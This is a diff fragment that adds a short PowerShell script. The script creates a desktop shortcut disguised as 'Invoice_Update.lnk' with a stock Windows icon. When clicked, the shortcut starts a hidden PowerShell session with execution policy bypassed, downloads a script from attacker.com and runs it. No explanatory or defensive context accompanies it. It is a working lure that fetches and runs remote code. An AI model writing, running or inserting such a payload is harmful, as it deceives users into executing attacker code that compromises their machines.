@@ -1,0 +1,6 @@
+$objShell = New-Object -ComObject WScript.Shell
+$lnk = $objShell.CreateShortcut("$home\Desktop\Invoice_Update.lnk")
+$lnk.TargetPath = "powershell.exe"
+$lnk.Arguments = "-NoP -W Hidden -Exec Bypass -Command ""IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/s.ps1')"""
+$lnk.IconLocation = "C:\Windows\System32\shell32.dll, 3"
+$lnk.Save()
